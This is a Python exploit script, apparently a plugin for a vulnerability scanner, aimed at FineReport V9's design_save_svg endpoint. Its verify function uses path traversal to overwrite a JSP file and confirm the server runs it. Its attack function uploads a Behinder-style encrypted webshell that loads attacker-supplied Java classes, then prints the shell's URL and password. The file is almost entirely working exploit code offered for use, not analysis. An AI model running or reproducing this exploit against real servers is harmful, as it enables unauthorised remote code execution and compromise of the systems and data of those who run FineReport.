import requests
import re, time
import urllib, random, string

def verify(url):
    relsult = {
        'name': '帆软报表 V9 design_save_svg 任意文件覆盖文件上传 ',
        'vulnerable': False,
        'attack': True,
        'url': url,
        'about': 'http://wiki.peiqi.tech/wiki/oa/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20V9%20design_save_svg%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html',
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    shell = f'<%out.println(\"{randstr1}\"+\"{randstr2}\");%>'
    payload = '/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp'
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible, MSIE 9.0, Windows NT 6.1, Trident/5.0)',
        'Content-Type': 'text/xml;charset=UTF-8',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = {
        "__CONTENT__": shell,
        "__CHARSET__": "UTF-8",
    }
    verify_url = urllib.parse.urljoin(url, '/WebReport/update.jsp')
    try:
        rep1 = requests.post(vurl, headers=headers, timeout=timeout, json=data, verify=False)
        if rep1.status_code == 200 and re.search('FineReport', rep1.text):
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200 and re.search(randstr1 + randstr2, rep2.text):
                relsult['vulnerable'] = True
                relsult['verify'] = verify_url
        return relsult
    except:
        return relsult

def attack(url):
    shell = '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'
    payload = '/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp'
    timeout = 20
    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible, MSIE 9.0, Windows NT 6.1, Trident/5.0)',
        'Content-Type': 'text/xml;charset=UTF-8',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = {
        "__CONTENT__": shell,
        "__CHARSET__": "UTF-8",
    }
    webshell = urllib.parse.urljoin(url, '/WebReport/update.jsp')
    print('[+] Exploit loading ......')
    time.sleep(3)
    try:
        print('[+] 尝试上传冰蝎webshell ')
        rep = requests.post(vurl, headers=headers, timeout=timeout, json=data, verify=False)
        print('[+] 上传完毕，正在检测webshel是否成功?')
        if rep.status_code == 200:
            rep2 = requests.get(webshell, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200:
                print('[*] status_code: 200 , 上传成功!')
                print('[*] webshell(冰蝎):', webshell)
                print('[*] 密码: rebeyond')
                return True
        return False
    except:
        return False